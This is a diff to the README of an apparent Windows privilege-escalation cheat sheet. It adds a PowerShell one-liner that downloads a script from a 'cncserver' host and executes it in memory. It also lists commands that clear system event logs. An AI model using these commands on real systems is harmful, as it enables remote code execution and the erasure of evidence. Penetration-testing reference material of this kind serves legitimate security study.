@@ -26,11 +26,13 @@ Repository on Windows Privilege Escalation, It contains helpful resources which 
 
 ### PowerShell:
 
-`Invoke-WebRequest "http://127.0.0.1/sample.exe" -OutFile "C:\temp\sample.exe"` (This will only download the file)
+Download file and save to disk :
 
-`echo IEX(New-Object Net.WebClient).DownloadString('http://127.0.0.1/sample.exe') | powershell -noprofile -`
+`Invoke-WebRequest "http://127.0.0.1/sample.exe" -OutFile "C:\temp\sample.exe"`
 
-`powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://127.0.0.1/sample.ps1')|iex"`
+Download and execute in memory :
+
+`iex (New-Object Net.WebClient).DownloadString('http://cncserver/samplescript.ps1')`
 
 ### Post exploitation enumeration:
 
@@ -46,6 +48,8 @@ Repository on Windows Privilege Escalation, It contains helpful resources which 
 - `wevtutil el` : List all logs on the system
 - `wevtutil cl System` : Clear all logs (Requires Admin Privileges)
 - `wmic logicaldisk get Caption,Description` : List all hard-drives on the system
+- `sc query | findstr "SERVICE_NAME"` : Display all service names
+
 
 # Socials
 
